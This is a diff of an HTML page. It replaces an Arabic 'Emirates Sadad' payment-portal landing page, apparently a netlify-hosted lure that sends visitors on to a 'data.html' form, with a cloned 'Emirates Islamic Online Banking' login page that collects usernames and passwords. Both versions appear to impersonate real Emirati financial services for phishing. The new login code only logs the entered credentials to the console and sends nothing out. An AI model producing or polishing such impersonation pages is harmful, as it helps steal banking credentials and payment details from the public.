@@ -1,47 +1,26 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-    <title>بوابة سداد الإمارات - الدفع الإلكتروني الآمن</title>
-
-    <!-- شعار المتصفح (Favicon) -->
-    <link rel="icon" type="image/png" href="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png">
-    <link rel="apple-touch-icon" href="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png">
-
-    <!-- وسوم المعاينة الشاملة لضمان الظهور على واتساب وتلجرام -->
-    <meta name="description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة - ادفع فواتيرك ورسومك بكل يسر وأمان.">
-    
-    <!-- Open Graph (Facebook / WhatsApp / Telegram) -->
-    <meta property="og:site_name" content="سداد الإمارات" />
-    <meta property="og:title" content="بوابة سداد الإمارات" />
-    <meta property="og:description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة - ادفع فواتيرك ورسومك بكل يسر وأمان." />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://melodious-paprenjak-72bce3.netlify.app/" />
-    <meta property="og:image" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" />
-    <meta property="og:image:secure_url" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" />
-    <meta property="og:image:type" content="image/png" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="بوابة سداد الإمارات" />
-    <meta name="twitter:description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة" />
-    <meta name="twitter:image" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" />
-
-    <!-- Schema.org -->
-    <meta itemprop="name" content="بوابة سداد الإمارات">
-    <meta itemprop="description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة">
-    <meta itemprop="image" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emirates Islamic - Online Banking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        /* ============================================
+           Emirates Islamic Login Page - CSS Styles
+           ============================================ */
+
         :root {
-            --primary-green: #1a6b1a;
-            --text-dark: #2c2c2c;
-            --text-medium: #555555;
-            --background-light: #fafafa;
+            --primary-purple: #6A3787;
+            --primary-purple-rgb: 106, 55, 135;
+            --button-gradient-start: #D7DAE5;
+            --button-gradient-end: #A4A7AF;
+            --text-dark: #575757;
+            --text-light: #f5f5f5;
+            --border-color: rgba(0, 0, 0, 0.12);
+            --background-light: #f5f5f5;
             --white: #ffffff;
         }
 
@@ -51,126 +30,511 @@
             box-sizing: border-box;
         }
 
+        html,
         body {
-            font-family: 'Segoe UI', 'Arial', sans-serif;
+            width: 100%;
+            height: 100%;
+            font-family: 'Open Sans', sans-serif;
             background-color: var(--background-light);
             color: var(--text-dark);
-            line-height: 1.7;
+        }
+
+        .login-container {
+            display: flex;
+            flex-direction: column;
             min-height: 100vh;
+            background-color: var(--background-light);
         }
 
-        .header {
-            background: var(--white);
-            padding: 32px 24px 28px;
-            text-align: center;
-            border-bottom: 1px solid rgba(0,0,0,0.05);
+        /* ============================================
+           Header Styles
+           ============================================ */
+
+        .login-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            background-color: var(--white);
+            border-bottom: 1px solid #e0e0e0;
         }
 
-        .logo-image {
-            max-width: 180px;
-            display: block;
-            margin: 0 auto 20px;
+        .logo-section {
+            display: flex;
+            align-items: center;
         }
 
-        .main-content {
-            background: var(--white);
-            padding: 40px 24px;
+        .logo-section svg {
+            height: 40px;
+            width: auto;
         }
 
-        .phone-image {
-            width: 300px;
-            display: block;
-            margin: 0 auto 40px;
-        }
-
-        .about-section {
-            max-width: 480px;
-            margin: 0 auto;
-            text-align: center;
-        }
-
-        .cta-button {
-            display: block;
-            width: 100%;
-            padding: 16px 32px;
-            background: var(--primary-green);
-            color: var(--white);
-            text-decoration: none;
-            border-radius: 28px;
-            font-size: 1.063rem;
+        .language-toggle {
+            background-color: #FFD700;
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 14px;
             font-weight: 600;
-            text-align: center;
             cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .language-toggle:hover {
+            background-color: #FFC700;
+        }
+
+        /* ============================================
+           Main Content
+           ============================================ */
+
+        .login-main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .login-content {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        /* ============================================
+           Welcome Section
+           ============================================ */
+
+        .welcome-section {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .welcome-section h1 {
+            font-size: 24px;
+            font-weight: 300;
+            color: var(--text-dark);
+            line-height: 1.4;
+        }
+
+        /* ============================================
+           Login Form
+           ============================================ */
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        /* ============================================
+           Form Group
+           ============================================ */
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .form-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-dark);
+            display: block;
+        }
+
+        /* ============================================
+           Form Field Wrapper
+           ============================================ */
+
+        .form-field-wrapper {
             position: relative;
-            overflow: hidden;
+            display: flex;
+            align-items: center;
+            border: 2px solid var(--border-color);
+            border-radius: 4px;
+            background-color: var(--white);
+            transition: border-color 0.3s ease;
         }
 
-        .spinner {
-            width: 22px;
-            height: 22px;
-            border: 3px solid rgba(255,255,255,.4);
-            border-top: 3px solid #fff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: none;
+        .form-field-wrapper:focus-within {
+            border-color: var(--primary-purple);
         }
 
-        @keyframes spin {
-            to { transform: translate(-50%, -50%) rotate(360deg); }
+        .form-input {
+            flex: 1;
+            border: none;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-family: 'Open Sans', sans-serif;
+            color: var(--text-dark);
+            background-color: transparent;
+            outline: none;
         }
 
-        .btn-text {
-            display: inline-block;
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        /* ============================================
+           Password Field Specific
+           ============================================ */
+
+        .password-wrapper {
+            padding-right: 12px;
+        }
+
+        .password-toggle {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.2s ease;
+        }
+
+        .password-toggle:hover {
+            opacity: 0.7;
+        }
+
+        .password-toggle svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* ============================================
+           Checkbox Styles
+           ============================================ */
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .checkbox-input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: var(--primary-purple);
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: var(--text-dark);
+            cursor: pointer;
+            user-select: none;
+        }
+
+        /* ============================================
+           Button Styles
+           ============================================ */
+
+        .btn {
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        /* Primary Button (Login) */
+        .btn-primary {
+            background: linear-gradient(91.36deg, var(--button-gradient-start), var(--button-gradient-end));
+            color: var(--white);
+            width: 100%;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-primary:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Secondary Button (Register) */
+        .btn-secondary {
+            background-color: var(--white);
+            color: var(--primary-purple);
+            border: 2px solid var(--primary-purple);
+            width: 100%;
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(var(--primary-purple-rgb), 0.05);
+        }
+
+        .btn-secondary:active {
+            background-color: rgba(var(--primary-purple-rgb), 0.1);
+        }
+
+        /* Tertiary Button (Forgot Credentials) */
+        .btn-tertiary {
+            background-color: transparent;
+            color: var(--primary-purple);
+            border: 2px solid transparent;
+            width: 100%;
+            text-decoration: underline;
+        }
+
+        .btn-tertiary:hover {
+            background-color: rgba(var(--primary-purple-rgb), 0.05);
+        }
+
+        .btn-tertiary:active {
+            background-color: rgba(var(--primary-purple-rgb), 0.1);
+        }
+
+        /* ============================================
+           Register Section
+           ============================================ */
+
+        .register-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .register-text {
+            font-size: 14px;
+            color: var(--text-dark);
+        }
+
+        /* ============================================
+           Responsive Design
+           ============================================ */
+
+        @media (max-width: 768px) {
+            .login-header {
+                padding: 16px 20px;
+            }
+
+            .login-main {
+                padding: 20px 16px;
+            }
+
+            .login-content {
+                max-width: 100%;
+            }
+
+            .welcome-section h1 {
+                font-size: 20px;
+            }
+
+            .login-form {
+                gap: 20px;
+            }
+
+            .btn {
+                padding: 10px 20px;
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-header {
+                padding: 12px 16px;
+            }
+
+            .login-main {
+                padding: 16px 12px;
+            }
+
+            .welcome-section h1 {
+                font-size: 18px;
+            }
+
+            .login-form {
+                gap: 16px;
+            }
+
+            .form-input {
+                padding: 10px 12px;
+                font-size: 13px;
+            }
+
+            .btn {
+                padding: 10px 16px;
+                font-size: 12px;
+            }
         }
     </style>
 </head>
-
 <body>
+    <div class="login-container">
+        <!-- Header with Language Toggle -->
+        <header class="login-header">
+            <div class="logo-section">
+                <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="120" height="40" fill="#1a1a3e" rx="4" />
+                    <text x="60" y="26" text-anchor="middle" fill="white" font-size="14" font-weight="bold" font-family="Open Sans">
+                        EMIRATES ISLAMIC
+                    </text>
+                </svg>
+            </div>
+            <button class="language-toggle">عربي</button>
+        </header>
 
-<header class="header">
-    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/ogJYCNVKSSWHpRAt.png" class="logo-image">
-    <h1>بوابة سداد الإمارات</h1>
-    <p>الدفع الإلكتروني الآمن</p>
-</header>
+        <!-- Main Login Form -->
+        <main class="login-main">
+            <div class="login-content">
+                <!-- Welcome Text -->
+                <div class="welcome-section">
+                    <h1>Welcome to Emirates Islamic Online Banking</h1>
+                </div>
 
-<main class="main-content">
-    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/dWhlEBvDLdGMiZXk.png" class="phone-image">
+                <!-- Login Form -->
+                <form class="login-form" onsubmit="handleLogin(event)">
+                    <!-- Email/Username Field -->
+                    <div class="form-group">
+                        <label for="email" class="form-label">
+                            Email or Username
+                        </label>
+                        <div class="form-field-wrapper">
+                            <input
+                                id="email"
+                                type="text"
+                                class="form-input"
+                                placeholder=""
+                                required
+                            />
+                        </div>
+                    </div>
 
-    <section class="about-section">
-        <h2>عن سداد الإمارات</h2>
-        <p>
-            سداد الإمارات هي منصة دفع إلكتروني آمنة وسهلة الاستخدام تتيح للمواطنين والمقيمين
-            في دولة الإمارات العربية المتحدة دفع فواتيرهم ورسومهم الحكومية والخاصة بكل يسر وأمان.
-        </p>
+                    <!-- Password Field -->
+                    <div class="form-group">
+                        <label for="password" class="form-label">
+                            Password
+                        </label>
+                        <div class="form-field-wrapper password-wrapper">
+                            <input
+                                id="password"
+                                type="password"
+                                class="form-input"
+                                placeholder=""
+                                required
+                            />
+                            <button
+                                type="button"
+                                class="password-toggle"
+                                onclick="togglePasswordVisibility()"
+                                aria-label="Toggle password visibility"
+                            >
+                                <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M15 12C15 13.6569 13.6569 15 12 15C10.3431 15 9 13.6569 9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12Z" stroke="#3F2967" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M21.5 12.5C21.5 14.5 16.5 18.5 12 18.5C7.5 18.5 2.5 14.5 2.5 12.5C2.5 10.5 7 5.5 12 5.5C17 5.5 21.5 10.5 21.5 12.5Z" stroke="#3F2967" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
 
-        <a href="data.html" class="cta-button" id="startBtn">
-            <span class="btn-text" id="btnText">بدء الخدمة</span>
-            <span class="spinner" id="spinner"></span>
-        </a>
-    </section>
-</main>
+                    <!-- Remember Me Checkbox -->
+                    <div class="checkbox-group">
+                        <input
+                            id="remember"
+                            type="checkbox"
+                            class="checkbox-input"
+                        />
+                        <label for="remember" class="checkbox-label">
+                            Remember me
+                        </label>
+                    </div>
 
-<script>
-  const startBtn = document.getElementById('startBtn');
-  const spinner = document.getElementById('spinner');
-  const btnText = document.getElementById('btnText');
+                    <!-- Login Button -->
+                    <button type="submit" class="btn btn-primary">
+                        LOGIN
+                    </button>
 
-  startBtn.addEventListener('click', function(e) {
-    e.preventDefault();
+                    <!-- Forgot Credentials Button -->
+                    <button type="button" class="btn btn-tertiary" onclick="handleForgotCredentials()">
+                        FORGOT CREDENTIALS
+                    </button>
+                </form>
 
-    btnText.style.visibility = 'hidden';
-    spinner.style.display = 'block';
-    startBtn.style.pointerEvents = 'none';
+                <!-- Register Section -->
+                <div class="register-section">
+                    <p class="register-text">Don't have access to online banking?</p>
+                    <button type="button" class="btn btn-secondary" onclick="handleRegister()">
+                        REGISTER
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
 
-    setTimeout(() => {
-      window.location.href = "data.html";
-    }, 3000);
-  });
-</script>
+    <script>
+        // Toggle password visibility
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eye-icon');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                // Change to eye-off icon
+                eyeIcon.innerHTML = '<path d="M3 3l18 18M9.878 9.878C9.33 10.44 9 11.189 9 12c0 1.657 1.343 3 3 3c.811 0 1.56-.33 2.122-.878M9.878 9.878l6.364-6.364M9.878 9.878L3 3m15 15l-6.364-6.364m6.364 6.364C19.33 16.56 20 15.811 20 15c0-1.657-1.343-3-3-3c-.811 0-1.56.33-2.122.878" stroke="#3F2967" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>';
+            } else {
+                passwordInput.type = 'password';
+                // Change back to eye icon
+                eyeIcon.innerHTML = '<path d="M15 12C15 13.6569 13.6569 15 12 15C10.3431 15 9 13.6569 9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12Z" stroke="#3F2967" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M21.5 12.5C21.5 14.5 16.5 18.5 12 18.5C7.5 18.5 2.5 14.5 2.5 12.5C2.5 10.5 7 5.5 12 5.5C17 5.5 21.5 10.5 21.5 12.5Z" stroke="#3F2967" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>';
+            }
+        }
 
+        // Handle login form submission
+        function handleLogin(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const rememberMe = document.getElementById('remember').checked;
+            
+            console.log('Login attempt:', {
+                email: email,
+                password: password,
+                rememberMe: rememberMe
+            });
+            
+            alert('Login submitted!\nEmail: ' + email + '\nRemember Me: ' + rememberMe);
+        }
+
+        // Handle forgot credentials button
+        function handleForgotCredentials() {
+            alert('Redirecting to Forgot Credentials page...');
+            // window.location.href = '/forgot-credentials';
+        }
+
+        // Handle register button
+        function handleRegister() {
+            alert('Redirecting to Register page...');
+            // window.location.href = '/register';
+        }
+
+        // Handle language toggle
+        document.querySelector('.language-toggle').addEventListener('click', function() {
+            alert('Language changed to Arabic');
+            // Implement language switching logic here
+        });
+    </script>
 </body>
 </html>
